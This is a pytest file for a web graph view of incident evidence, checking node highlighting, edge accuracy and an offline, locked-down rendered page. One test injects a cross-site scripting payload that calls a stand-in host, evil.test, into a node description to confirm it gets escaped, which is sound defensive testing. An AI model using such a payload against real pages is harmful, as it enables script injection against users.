import json
import re

from ui.graph_view import build_network, render_evidence_graph


def test_expected_nodes_edges_and_highlight(evidence, valid_analysis):
    graph = build_network(evidence, {**valid_analysis, "analysis_available": True})
    ids = {n["id"] for n in graph.nodes}
    assert "component:analytics-api" in ids
    assert "deployment:deploy-014" in ids
    node = next(n for n in graph.nodes if n["id"] == "deployment:deploy-014")
    assert node["borderWidth"] == 3
    assert node["color"]["border"] == "#FF6B76"
    retrieved = {(e["source"], e["type"], e["target"]) for e in evidence["graph"]["edges"]}
    by_visual = {f"{n['label'].lower()}:{n['id']}": n["id"] for n in evidence["graph"]["nodes"]}
    assert len(graph.edges) == len(retrieved)
    for e in graph.edges:
        assert (by_visual[e["from"]], e["title"].split(" · ")[0], by_visual[e["to"]]) in retrieved
    assert any(
        e["from"] == "component:analytics-api" and e["to"] == "component:analytics-store"
        for e in graph.edges
    )
    assert any(
        e["from"] == "deployment:deploy-014" and e["to"] == "component:event-connector"
        for e in graph.edges
    )


def test_no_highlights_without_validated_analysis(evidence, valid_analysis):
    graph = build_network(evidence, {**valid_analysis, "analysis_available": False})
    assert all(n["borderWidth"] == 1 for n in graph.nodes)


def test_inline_assets_no_network_requests(evidence):
    document = render_evidence_graph(evidence)
    assert not re.search(r"<(script|link|img)[^>]+(?:src|href)=[\"']https?://", document)
    assert "connect-src 'none'" in document
    assert "new vis.Network" in document
    assert "component:analytics-api" in document
    assert len(document) > 100_000


def test_hostile_text_stays_data(evidence):
    evidence["graph"]["nodes"][0]["description"] = (
        '</script><script>fetch("https://evil.test")</script>'
    )
    document = render_evidence_graph(evidence)
    assert '</script><script>fetch("https://evil.test")' not in document
    network = build_network(evidence)
    assert "&lt;/script&gt;" in json.dumps(network.nodes)
